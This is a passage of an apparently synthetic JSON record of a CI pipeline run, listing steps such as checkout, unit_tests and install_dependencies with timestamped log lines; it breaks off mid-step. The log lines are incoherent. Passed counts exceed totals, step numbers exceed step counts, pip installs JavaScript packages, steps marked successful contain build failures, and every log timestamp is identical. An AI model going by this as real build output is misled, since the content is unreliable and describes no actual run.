          "[12:46:43] DEBUG: Connection pool: 12 active",
          "Compiling src/app.ts...",
          "\u2713 Task completed in 3807ms",
          "OK",
          "Loading...",
          "TLS handshake completed",
          "Compiling lib/app.ts...",
          "[12:46:43] INFO: Connecting to database",
          "Pulling image: alpine:18",
          "Compiling components/main.py...",
          "\u2717 build failed with exit code 24",
          "Compiling components/handler.rs...",
          "Connection established",
          "TLS handshake completed",
          "Artifact downloaded: 46MB",
          "Coverage: 93% statements, 95% branches",
          "HEAD is now at 5c0b39d",
          "HEAD is now at d8360c8",
          "Tests: 196 passed, 489 total",
          "Pulling image: alpine:3.11",
          "\u2717 build failed with exit code 25",
          "Verifying...",
          "Fetching submodules...",
          "Switched to branch 'hotfix/task-496'",
          "Step 9/22: Installing dependencies",
          "\u2713 validate completed",
          "Time: 37.136s",
          "Step 10/20: Deploying",
          "Step 19/22: Linting",
          "OK",
          "Platform: darwin-arm64",
          "yarn add: Done in 26.9s",
          "Step 11/23: Deploying",
          "npm notice: created a lockfile",
          "Success!",
          "Pulling image: alpine:latest",
          "[12:46:43] INFO: Connecting to database",
          "[12:46:43] ERROR: Connection failed",
          "Step 13/19: Building",
          "\u2713 test completed",
          "\u2713 Step 'checkout' succeeded",
          "pip install: Successfully installed jest-4.7",
          "Compiling lib/service.java...",
          "[12:46:43] INFO: Request completed",
          "Verifying...",
          "Platform: win32-x64",
          "Success!",
          "\u2713 Step 'setup' succeeded",
          "[12:46:43] INFO: Request completed",
          "Ran 20 tests in 32s",
          "Building Docker image...",
          "\u2713 test completed",
          "WARNING: prettier has known vulnerabilities",
          "Bundling main.js",
          "Pushing to registry...",
          "Cache restored successfully (64MB)",
          "[12:46:43] INFO: Starting build process",
          "Environment: development",
          "npm notice: created a lockfile",
          "Bundling vendor.css",
          "HEAD is now at 02e6d03",
          "Uploading artifact 'build' (41 files)",
          "Platform: linux-x64",
          "Snapshots: 10 passed, 22 total",
          "npm install: resolved 199 packages",
          "Cache miss for key-1019",
          "Fetching submodules...",
          "Platform: win32-x64",
          "Step 7/23: Deploying",
          "[12:46:43] DEBUG: Query executed in 67ms",
          "Step 12/23: Running migrations",
          "npm install: added 91 packages",
          "[12:46:43] INFO: Connecting to database",
          "Creating production build...",
          "Platform: linux-x64",
          "Generating source maps...",
          "npm notice: package.json updated",
          "WARNING: express has known vulnerabilities",
          "  PASS: e2e/test_user_create.spec.js",
          "pip: Collecting express",
          "Step 19/17: Building",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-26T12:47:32.841860",
        "finished_at": "2025-11-26T12:47:41.604371",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:46:43] DEBUG: Connection pool: 8 active",
          "Pulling image: alpine:3.11",
          "Compiling src/handler.rs...",
          "[12:46:43] ERROR: Connection failed",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "Step 14/16: Testing",
          "[12:46:43] INFO: Cache refreshed",
          "Success!",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:43] INFO: Request completed",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ready.",
          "Cache miss for key-6814",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:46:43] DEBUG: Connection pool: 18 active",
          "npm notice: package.json updated",
          "Step 10/21: Running migrations",
          "Exception: RuntimeError",
          "POST /api - 202 (252ms)",
          "[12:46:43] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Done.",
          "Environment: development",
          "npm install: added 67 packages",
          "Bundling vendor.css",
          "Switched to branch 'feature/task-656'",
          "Bundling main.css",
          "Done.",
          "Cache miss for key-4788",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache saved successfully",
          "Finished.",
          "Using Python 3.10",
          "Step 3/16: Deploying",
          "\u2717 build failed with exit code 7",
          "Cache restored successfully (388MB)",
          "Pulling image: python:18",
          "Snapshots: 28 passed, 27 total",
          "Creating production build...",
          "WARNING: jest has known vulnerabilities",
          "Verifying...",
          "Creating production build...",
          "FAILED: test_db_connect",
          "Step 11/22: Linting",
          "[12:46:43] DEBUG: Memory usage: 1544MB",
          "\u2713 All checks passed",
          "[12:46:43] DEBUG: Initializing service",
          "Snapshots: 48 passed, 39 total",
          "[12:46:43] INFO: Processing request",
          "Processing...",
          "[12:46:43] DEBUG: Query executed in 70ms",
          "FAILED: test_api_health",
          "Bundling runtime.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Loading...",
          "npm install: resolved 1173 packages",
          "Fetching from https://registry.npmjs.org/package.json",
          "[12:46:43] DEBUG: Memory usage: 188MB",
          "Switched to branch 'hotfix/task-358'",
          "\u2713 All checks passed",
          "Snapshots: 36 passed, 3 total",
          "Step 16/17: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "OK",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Coverage: 83% statements, 71% branches",
          "Layer 6/10: ENV command",
          "GET /api - 200 (66ms)",
          "NODE_ENV=development",
          "Artifact uploaded: dist.zip (83MB)",
          "[12:46:43] INFO: Request completed",
          "[12:46:43] INFO: Request completed",
          "Transforming 485 files...",
          "Tests: 226 passed, 149 total",
          "Image pulled successfully",
          "Bundling runtime.js",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Compiling utils/service.java...",
          "[12:46:43] DEBUG: Loading configuration",
          "Tests: 97 passed, 352 total",
          "pip: Collecting react",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:43] INFO: Connecting to database",
          "pip install: Successfully installed react-2.12",
          "Artifact uploaded: dist.zip (27MB)",
          "Environment: staging",
          "[12:46:43] DEBUG: Initializing service",
          "Switched to branch 'hotfix/task-353'",
          "pip: Downloading prettier-1.3.tar.gz",
          "Completed.",
          "Loading...",
          "Cache hit for key-7590",
          "  PASS: unit/test_cache_hit.spec.js",
          "WARNING: react has known vulnerabilities",
          "Step 14/20: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:43] INFO: Request completed",
          "\u2713 All checks passed",
          "[12:46:43] DEBUG: Query executed in 97ms",
          "Step 1/19: Building",
          "Switched to branch 'bugfix/task-914'",
          "[12:46:43] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "Step 12/24: Running migrations",
          "Fetching from https://amazonaws.com/package.json",
          "Time: 46.109s",
          "POST /upload - 200 (403ms)",
          "Switched to branch 'bugfix/task-285'",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: NullPointerException",
          "[12:46:43] INFO: Request completed",
          "Step 18/22: Installing dependencies",
          "\u2713 All checks passed",
          "Using Python 3.11",
          "Step 1/17: Installing dependencies",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Ready.",
          "Cache restored successfully (259MB)",
          "pip install: Successfully installed express-3.2",
          "pip: Collecting prettier",
          "\u2717 build failed with exit code 28",
          "Transforming 266 files...",
          "HEAD is now at fd5b5b2",
          "Verifying...",
          "pip: Downloading webpack-4.1.tar.gz",
          "Switched to branch 'bugfix/task-330'",
          "Step 11/20: Building",
          "Step 7/22: Building",
          "Cache invalidated: dependencies",
          "[12:46:43] DEBUG: Loading configuration",
          "Cache miss for key-8064",
          "Snapshots: 11 passed, 48 total",
          "Minifying app.js",
          "HEAD is now at 5c4da20",
          "pip: Collecting eslint",
          "[12:46:43] INFO: Processing request",
          "Step 3/21: Running migrations",
          "Building Docker image...",
          "WARNING: axios has known vulnerabilities",
          "HEAD is now at 6628fed",
          "Pushing to registry...",
          "Already up to date.",
          "Waiting...",
          "TLS handshake completed",
          "WARNING: prettier has known vulnerabilities",
          "Creating production build...",
          "Platform: darwin-arm64",
          "Verifying...",
          "OK",
          "Step 8/24: Installing dependencies",
          "[12:46:43] INFO: Starting build process",
          "Waiting...",
          "pip: Collecting webpack",
          "Platform: darwin-arm64",
          "Cache saved successfully",
          "Time: 71.746s",
          "Checking out master branch",
          "Time: 47.233s",
          "Bundling main.css",
          "NODE_ENV=production",
          "Artifact downloaded: 47MB",
          "Using Python 3.11",
          "[12:46:43] INFO: Cache refreshed",
          "Cache saved successfully",
          "Using Node.js 14.19.6",
          "pip: Installing build dependencies...",
          "Using Python 3.9",
          "OK",
          "Compiling utils/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Artifact uploaded: dist.zip (70MB)",
          "Creating production build...",
          "\u2717 build failed with exit code 93",
          "\u2717 build failed with exit code 50",
          "\u2713 Step 'build' succeeded",
          "Verifying...",
          "Environment: test",
          "pip: Downloading lodash-5.1.tar.gz",
          "Compiling utils/app.ts...",
          "NODE_ENV=development",
          "Compiling utils/index.js...",
          "Loading...",
          "Pulling image: node:latest",
          "Minifying main.js",
          "[12:46:43] DEBUG: Query executed in 65ms",
          "Cache hit for key-6846",
          "Step 6/18: Linting",
          "Compiling src/handler.rs...",
          "Building Docker image...",
          "[12:46:43] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (61MB)",
          "[12:46:43] DEBUG: Initializing service",
          "Environment: staging",
          "\u2717 build failed with exit code 6",
          "Uploading artifact 'dist' (15 files)",
          "Uploading artifact 'build' (20 files)",
          "Cache restored successfully (249MB)",
          "GET /health - 200 (64ms)",
          "[12:46:43] INFO: Request completed",
          "NODE_ENV=test",
          "  PASS: unit/test_user_create.spec.js",
          "Bundling vendor.js",
          "\u2717 build failed with exit code 11",
          "Waiting...",
          "Step 8/15: Building",
          "WARNING: express has known vulnerabilities",
          "Generating source maps...",
          "Uploading artifact 'coverage' (34 files)",
          "Pushing to registry...",
          "WARNING: webpack has known vulnerabilities",
          "Pushing to registry...",
          "Test Suites: 22 passed, 47 total",
          "Creating production build...",
          "Cache restored successfully (427MB)",
          "Pulling image: python:3.11",
          "Compiling components/handler.rs...",
          "Artifact uploaded: dist.zip (28MB)",
          "[12:46:43] DEBUG: Loading configuration",
          "[12:46:43] INFO: Cache refreshed",
          "Compiling src/main.py...",
          "Compiling lib/index.js...",
          "[12:46:43] WARN: Deprecated API usage",
          "pip: Downloading eslint-5.19.tar.gz",
          "npm install: resolved 361 packages",
          "Finished.",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "WARNING: webpack has known vulnerabilities",
          "Cache restored successfully (282MB)",
          "Connection established",
          "Ready.",
          "[12:46:43] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "[12:46:43] INFO: Processing request",
          "GET /status - 204 (47ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_cache_hit (4ms)",
          "Minifying vendor.js",
          "Connection established",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Minifying vendor.js",
          "WARNING: lodash has known vulnerabilities",
          "Snapshots: 46 passed, 46 total",
          "Compiling lib/handler.rs...",
          "Step 13/23: Testing",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-26T12:47:41.604371",
        "finished_at": "2025-11-26T12:47:45.109376",
        "log_lines": [
          "=== Step: checkout ===",
          "\u2713 build completed",
          "Creating production build...",
          "Step 15/20: Testing",
          "[12:46:43] INFO: Connecting to database",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: resolved 1284 packages",
          "npm notice: created a lockfile",
          "Cache hit for key-3856",
          "Time: 8.908s",
          "  PASS: unit/test_auth_login.spec.js",
          "pip: Installing build dependencies...",
          "Cache restored successfully (59MB)",
          "Step 2/22: Testing",
          "Loading...",
          "[12:46:43] DEBUG: Query executed in 99ms",
          "Loading...",
          "Done.",
          "yarn add: Done in 22.87s",
          "Switched to branch 'hotfix/task-919'",
          "Minifying main.js",
          "Ready.",
          "Loading...",
          "Checking out master branch",
          "Bundling runtime.css",
          "TLS handshake completed",
          "POST /api - 201 (483ms)",
          "Artifact downloaded: 20MB",
          "[12:46:43] INFO: Processing request",
          "pip: Installing build dependencies...",
          "Finished.",
          "Cache saved successfully",
          "yarn add: Done in 18.64s",
          "pip: Collecting webpack",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (2MB)",
          "Step 18/22: Testing",
          "GET /status - 201 (25ms)",
          "Artifact uploaded: dist.zip (91MB)",
          "[12:46:43] DEBUG: Connection pool: 2 active",
          "[12:46:43] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 107",
          "Success!",
          "Pulling image: alpine:3.11",
          "GET /status - 201 (15ms)",
          "Time: 100.396s",
          "Time: 76.16s",
          "Waiting...",
          "npm notice: created a lockfile",
          "\u2717 build failed with exit code 63",
          "yarn add: Done in 11.87s",
          "Creating production build...",
          "TLS handshake completed",
          "Loading...",
          "[12:46:43] WARN: Deprecated API usage",
          "POST /api - 202 (168ms)",
          "[12:46:43] INFO: Processing request",
          "Pulling image: python:3.11",
          "Success!",
          "npm install: resolved 494 packages",
          "\u2713 Task completed in 4453ms",
          "OK",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 All checks passed",
          "Waiting...",
          "Step 16/15: Building",
          "yarn add: Done in 15.48s",
          "Switched to branch 'hotfix/task-574'",
          "\u2713 Task completed in 3775ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Optimizing 85 modules...",
          "\u2713 Task completed in 3868ms",
          "Platform: linux-x64",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] DEBUG: Query executed in 10ms",
          "Cache miss for key-2188",
          "Step 3/23: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling utils/main.py...",
          "pip: Downloading webpack-4.4.tar.gz",
          "[12:46:43] INFO: Processing request",
          "Installing lodash@5.1.6",
          "Generating source maps...",
          "pip install: Successfully installed express-2.8",
          "Cache miss for key-1212",
          "\u2717 build failed with exit code 10",
          "FAILED: test_auth_login",
          "Success!",
          "Creating production build...",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling lib/handler.rs...",
          "[12:46:43] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "Step 12/21: Installing dependencies",
          "Fetching submodules...",
          "Optimizing 52 modules...",
          "Pulling image: node:3.11",
          "pip: Downloading jest-1.4.tar.gz",
          "\u2713 All checks passed",
          "POST /api - 201 (237ms)",
          "Compiling utils/service.java...",
          "Cache miss for key-2129",
          "Step 14/23: Testing",
          "Bundling runtime.js",
          "Time: 24.747s",
          "Compiling src/index.js...",
          "Completed.",
          "Verifying...",
          "Compiling utils/index.js...",
          "[12:46:43] INFO: Starting build process",
          "Optimizing 83 modules...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:46:43] DEBUG: Loading configuration",
          "Using Node.js 20.5.5",
          "[12:46:43] INFO: Request completed",
          "yarn add: Done in 24.15s",
          "Step 10/17: Linting",
          "yarn add: Done in 23.12s",
          "WARNING: react has known vulnerabilities",
          "Fetching from https://googleapis.com/package.json",
          "Artifact downloaded: 6MB",
          "Connection established",
          "NODE_ENV=test",
          "[12:46:43] INFO: Starting build process",
          "Loading...",
          "Loading...",
          "Switched to branch 'feature/task-363'",
          "GET /health - 204 (77ms)",
          "Done.",
          "Ready.",
          "Step 5/24: Building",
          "Using Node.js 20.16.10",
          "Uploading artifact 'dist' (17 files)",
          "Step 8/18: Testing",
          "\u2713 Step 'build' succeeded",
          "TLS handshake completed",
          "Generating source maps...",
          "NODE_ENV=development",
          "Environment: development",
          "Artifact downloaded: 9MB",
          "FAILED: test_auth_login",
          "Done.",
          "Loading...",
          "Cache invalidated: node_modules",
          "Using Python 3.10",
          "  PASS: integration/test_user_create.spec.js",
          "[12:46:43] INFO: Starting build process",
          "Platform: linux-x64",
          "Using Node.js 14.8.8",
          "[12:46:43] DEBUG: Initializing service",
          "Creating production build...",
          "[12:46:43] WARN: Deprecated API usage",
          "Bundling styles.css",
          "[12:46:43] DEBUG: Query executed in 70ms",
          "Using Python 3.9",
          "Step 11/15: Deploying",
          "Coverage: 76% statements, 67% branches",
          "Switched to branch 'bugfix/task-102'",
          "[12:46:43] DEBUG: Query executed in 12ms",
          "Exception: RuntimeError",
          "Using Node.js 15.3.10",
          "Image pulled successfully",
          "Building Docker image...",
          "Compiling utils/main.py...",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: dist.zip (39MB)",
          "WARNING: jest has known vulnerabilities",
          "Optimizing 91 modules...",
          "Step 18/21: Linting",
          "Fetching from https://registry.npmjs.org/package.json",
          "HEAD is now at 01aec44",
          "Waiting...",
          "[12:46:43] INFO: Connecting to database",
          "Test Suites: 27 passed, 13 total",
          "Coverage: 84% statements, 89% branches",
          "\u2713 All checks passed",
          "Platform: linux-x64",
          "Pulling image: alpine:18",
          "Success!",
          "WARNING: axios has known vulnerabilities",
          "Step 10/16: Testing",
          "Transforming 568 files...",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 94",
          "pip: Collecting react",
          "  PASS: e2e/test_user_create.spec.js",
          "Checking out develop branch",
          "Processing...",
          "Fetching submodules...",
          "WARNING: react has known vulnerabilities",
          "Ran 156 tests in 49s",
          "Step 18/23: Installing dependencies",
          "Exception: NullPointerException",
          "[12:46:43] DEBUG: Memory usage: 1712MB",
          "Time: 92.635s",
          "Step 6/20: Building",
          "Step 5/17: Deploying",
          "  PASS: test_auth_login (87ms)",
          "Cache restored successfully (25MB)",
          "[12:46:43] INFO: Cache refreshed",
          "\u2713 Task completed in 4800ms",
          "Ran 164 tests in 33s",
          "Snapshots: 25 passed, 4 total",
          "[12:46:43] WARN: Deprecated API usage",
          "Verifying...",
          "Step 12/21: Running migrations",
          "[12:46:43] INFO: Processing request",
          "Time: 91.334s",
          "Pulling image: node:latest",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:43] INFO: Starting build process",
          "Step 14/25: Linting",
          "Processing...",
          "[12:46:43] INFO: Processing request",
          "npm notice: package.json updated",
          "Connection established",
          "Step 19/16: Installing dependencies",
          "Processing...",
          "Step 4/17: Testing",
          "Building Docker image...",
          "Exception: TypeError",
          "Layer 1/9: RUN command",
          "Step 15/17: Building",
          "Artifact downloaded: 6MB",
          "[12:46:43] DEBUG: Loading configuration",
          "pip: Downloading express-4.4.tar.gz",
          "Already up to date.",
          "[12:46:43] INFO: Processing request",
          "Installing react@5.19.1",
          "Using Python 3.11",
          "Installing prettier@1.17.10",
          "Waiting...",
          "[12:46:43] INFO: Processing request",
          "\u2713 deploy completed",
          "Installing prettier@1.9.8",
          "Waiting...",
          "Using Python 3.9",
          "NODE_ENV=production",
          "Pulling image: python:18",
          "Cache restored successfully (254MB)",
          "Step 11/19: Linting",
          "FAILED: test_auth_login",
          "[12:46:43] DEBUG: Loading configuration",
          "Fetching from https://gcr.io/package.json",
          "\u2713 All checks passed",
          "npm install: resolved 813 packages",
          "OK",
          "Test Suites: 27 passed, 6 total",
          "Step 15/22: Building",
          "Cache restored successfully (104MB)",
          "Cache restored successfully (280MB)",
          "pip: Collecting axios",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-26T12:47:45.109376",
        "finished_at": "2025-11-26T12:48:11.396910",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Exception: NullPointerException",
          "pip: Downloading webpack-1.4.tar.gz",
          "WARNING: react has known vulnerabilities",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Already up to date.",
          "\u2713 All checks passed",
          "Time: 11.782s",
          "GET /api - 201 (61ms)",
          "Compiling lib/main.py...",
          "Test Suites: 17 passed, 29 total",
          "Step 4/20: Testing",
          "[12:46:43] DEBUG: Initializing service",
          "Verifying...",
          "[12:46:43] DEBUG: Loading configuration",
          "\u2713 Step 'test' succeeded",
          "NODE_ENV=development",
          "Optimizing 44 modules...",
          "\u2713 Step 'test' succeeded",
          "Platform: win32-x64",
          "[12:46:43] DEBUG: Memory usage: 736MB",
          "Bundling runtime.css",
          "Environment: development",
          "pip: Installing build dependencies...",
          "yarn add: Done in 17.35s",
          "Processing...",
          "WARNING: express has known vulnerabilities",
          "Compiling src/utils.go...",
          "pip install: Successfully installed react-1.14",
          "[12:46:43] INFO: Processing request",
          "Processing...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Ready.",
          "[12:46:43] DEBUG: Query executed in 23ms",
          "Environment: production",
          "Time: 82.320s",
          "Layer 8/15: RUN command",
          "[12:46:43] INFO: Processing request",
          "Coverage: 89% statements, 67% branches",
          "Connection established",
          "npm notice: package.json updated",
          "Step 6/20: Building",
          "yarn add: Done in 20.32s",
          "[12:46:43] INFO: Request completed",
          "Completed.",
          "  PASS: test_cache_hit (222ms)",
          "Connection established",
          "npm notice: package.json updated",
          "\u2713 Task completed in 1069ms",
          "Creating production build...",
          "Checking out master branch",
          "Step 9/19: Linting",
          "Bundling main.js",
          "Time: 79.728s",
          "[12:46:43] INFO: Request completed",
          "[12:46:43] DEBUG: Initializing service",
          "[12:46:43] DEBUG: Connection pool: 17 active",
          "Installing lodash@4.19.4",
          "Coverage: 83% statements, 93% branches",
          "  PASS: test_cache_hit (131ms)",
          "[12:46:43] DEBUG: Loading configuration",
          "Time: 51.480s",
          "Artifact uploaded: dist.zip (15MB)",
          "Fetching from https://amazonaws.com/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache miss for key-1411",
          "WARNING: axios has known vulnerabilities",
          "Time: 13.664s",
          "Snapshots: 12 passed, 14 total",
          "Artifact uploaded: dist.zip (73MB)",
          "Compiling components/utils.go...",
          "Pushing to registry...",
          "\u2717 build failed with exit code 103",
          "Coverage: 88% statements, 66% branches",
          "Fetching submodules...",
          "pip install: Successfully installed react-4.2",
          "npm notice: package.json updated",
          "pip install: Successfully installed axios-1.2",
          "Artifact uploaded: dist.zip (16MB)",
          "Connection established",
          "Done.",
          "[12:46:43] DEBUG: Initializing service",
          "Checking out master branch",
          "[12:46:43] INFO: Starting build process",
          "Step 1/25: Deploying",
          "  PASS: test_auth_login (396ms)",
          "Bundling vendor.css",
          "[12:46:43] DEBUG: Initializing service",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed jest-5.14",
          "Artifact uploaded: dist.zip (24MB)",
          "WARNING: react has known vulnerabilities",
          "Environment: production",
          "Transforming 281 files...",
          "Using Python 3.10",
          "Optimizing 28 modules...",
          "\u2713 deploy completed",
          "[12:46:43] DEBUG: Memory usage: 1331MB",
          "Bundling main.css",
          "Layer 2/15: RUN command",
          "Fetching from https://registry.npmjs.org/package.json",
          "npm notice: package.json updated",
          "HEAD is now at eeaa115",
          "Waiting...",
          "Creating production build...",
          "[12:46:43] WARN: Deprecated API usage",
          "Using Python 3.10",
          "Switched to branch 'hotfix/task-223'",
          "pip: Downloading react-3.5.tar.gz",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Compiling components/utils.go...",
          "[12:46:43] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (61MB)",
          "Cache miss for key-3379",
          "Tests: 460 passed, 421 total",
          "Tests: 457 passed, 149 total",
          "Creating production build...",
          "TLS handshake completed",
          "Creating production build...",
          "  PASS: unit/test_api_health.spec.js",
          "[12:46:43] DEBUG: Initializing service",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "Building Docker image...",
          "Artifact downloaded: 7MB",
          "[12:46:43] ERROR: Connection failed",
          "[12:46:43] DEBUG: Loading configuration",
          "HEAD is now at 112b4db",
          "pip install: Successfully installed prettier-2.15",
          "Compiling src/utils.go...",
          "\u2713 Task completed in 394ms",
          "[12:46:43] INFO: Starting build process",
          "NODE_ENV=test",
          "[12:46:43] INFO: Cache refreshed",
          "Using Node.js 18.10.1",
          "npm install: added 233 packages",
          "Using Node.js 15.10.6",
          "[12:46:43] INFO: Cache refreshed",
          "Creating production build...",
          "Completed.",
          "pip: Collecting prettier",
          "Compiling components/utils.go...",
          "Bundling main.css",
          "Fetching from https://githubusercontent.com/package.json",
          "Cache invalidated: node_modules",
          "Compiling utils/main.py...",
          "Compiling lib/main.py...",
          "\u2713 Task completed in 4363ms",
          "pip: Installing build dependencies...",
          "Environment: production",
          "Artifact uploaded: dist.zip (17MB)",
          "npm install: resolved 479 packages",
          "Finished.",
          "POST /upload - 200 (231ms)",
          "Layer 3/10: ENV command",
          "Using Python 3.10",
          "Installing webpack@3.1.9",
          "[12:46:43] INFO: Cache refreshed",
          "  PASS: test_api_health (282ms)",
          "pip: Downloading jest-1.4.tar.gz",
          "\u2713 Step 'setup' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing axios@4.19.7",
          "npm install: resolved 1002 packages",
          "Environment: production",
          "Already up to date.",
          "pip: Downloading prettier-4.8.tar.gz",
          "Coverage: 95% statements, 80% branches",
          "WARNING: webpack has known vulnerabilities",
          "Artifact downloaded: 2MB",
          "Step 7/16: Installing dependencies",
          "HEAD is now at f1aa66a",
          "Ready.",
          "\u2713 All checks passed",
          "[12:46:43] DEBUG: Memory usage: 542MB",
          "OK",
          "Tests: 68 passed, 395 total",
          "Using Python 3.11",
          "Snapshots: 13 passed, 22 total",
          "npm notice: created a lockfile",
          "Layer 1/8: COPY command",
          "Compiling lib/index.js...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Success!",
          "[12:46:43] DEBUG: Initializing service",
          "Cache invalidated: build",
          "Layer 6/15: COPY command",
          "Time: 105.478s",
          "Generating source maps...",
          "Loading...",
          "Cache invalidated: node_modules",
          "[12:46:43] ERROR: Connection failed",
          "Time: 6.730s",
          "Using Node.js 17.10.6",
          "Fetching from https://docker.io/package.json",
          "Layer 2/13: COPY command",
          "Done.",
          "Exception: TypeError",
          "Processing...",
          "Tests: 316 passed, 238 total",
          "\u2713 deploy completed",
          "Finished.",
          "WARNING: jest has known vulnerabilities",
          "Uploading artifact 'coverage' (41 files)",
          "Step 11/17: Installing dependencies",
          "Completed.",
          "[12:46:43] DEBUG: Connection pool: 6 active",
          "Environment: development",
          "WARNING: lodash has known vulnerabilities",
          "TLS handshake completed",
          "Checking out master branch",
          "[12:46:43] INFO: Request completed",
          "Cache miss for key-6323",
          "Step 10/16: Building",
          "Optimizing 24 modules...",
          "Step 10/17: Linting",
          "[12:46:43] DEBUG: Initializing service",
          "Creating production build...",
          "Compiling utils/handler.rs...",
          "npm notice: package.json updated",
          "yarn add: Done in 17.45s",
          "  PASS: e2e/test_db_connect.spec.js",
          "Artifact downloaded: 26MB",
          "Step 19/24: Running migrations",
          "  PASS: e2e/test_api_health.spec.js",
          "pip: Downloading express-4.17.tar.gz",
          "[12:46:43] ERROR: Connection failed",
          "Processing...",
          "Optimizing 53 modules...",
          "\u2713 build completed",
          "Tests: 312 passed, 196 total",
          "WARNING: eslint has known vulnerabilities",
          "Time: 57.915s",
          "Ran 61 tests in 12s",
          "[12:46:43] WARN: Deprecated API usage",
          "WARNING: react has known vulnerabilities",
          "Step 14/18: Linting",
          "Ran 71 tests in 29s",
          "Artifact uploaded: dist.zip (1MB)",
          "yarn add: Done in 2.86s",
          "Step 1/23: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: dist.zip (63MB)",
          "Step 8/25: Deploying",
          "Compiling utils/index.js...",
          "\u2713 Step 'setup' succeeded",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:43] INFO: Processing request",
          "Cache hit for key-1489",
          "pip: Downloading webpack-4.17.tar.gz",
          "[12:46:43] INFO: Processing request",
          "Finished.",
          "Waiting...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-26T12:48:11.396910",
        "finished_at": "2025-11-26T12:48:37.684444",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Coverage: 93% statements, 69% branches",
          "Creating production build...",
          "Tests: 128 passed, 64 total",
          "[12:46:43] INFO: Processing request",
          "Step 2/25: Installing dependencies",
          "Environment: staging",
          "Step 5/19: Installing dependencies",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] INFO: Connecting to database",
          "pip: Downloading express-5.2.tar.gz",
          "POST /upload - 200 (268ms)",
          "Minifying app.js",
          "HEAD is now at 6ff8803",
          "NODE_ENV=production",
          "pip: Collecting express",
          "\u2713 All checks passed",
          "Step 3/25: Running migrations",
          "[12:46:43] INFO: Processing request",
          "POST /api - 201 (22ms)",
          "[12:46:43] INFO: Processing request",
          "[12:46:43] DEBUG: Query executed in 27ms",
          "Pushing to registry...",
          "npm install: added 302 packages",
          "Tests: 73 passed, 432 total",
          "Using Node.js 19.15.2",
          "Using Python 3.10",
          "npm install: resolved 929 packages",
          "TLS handshake completed",
          "Ready.",
          "  PASS: e2e/test_user_create.spec.js",
          "pip: Installing build dependencies...",
          "[12:46:43] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Step 3/19: Testing",
          "Already up to date.",
          "Finished.",
          "[12:46:43] DEBUG: Loading configuration",
          "Completed.",
          "Step 9/17: Building",
          "Environment: production",
          "Finished.",
          "\u2717 build failed with exit code 125",
          "Waiting...",
          "\u2713 package completed",
          "GET /status - 201 (19ms)",
          "WARNING: express has known vulnerabilities",
          "Step 7/21: Building",
          "Step 6/22: Installing dependencies",
          "[12:46:43] INFO: Starting build process",
          "Ready.",
          "Fetching submodules...",
          "Optimizing 38 modules...",
          "[12:46:43] WARN: Deprecated API usage",
          "Finished.",
          "Compiling utils/service.java...",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Creating production build...",
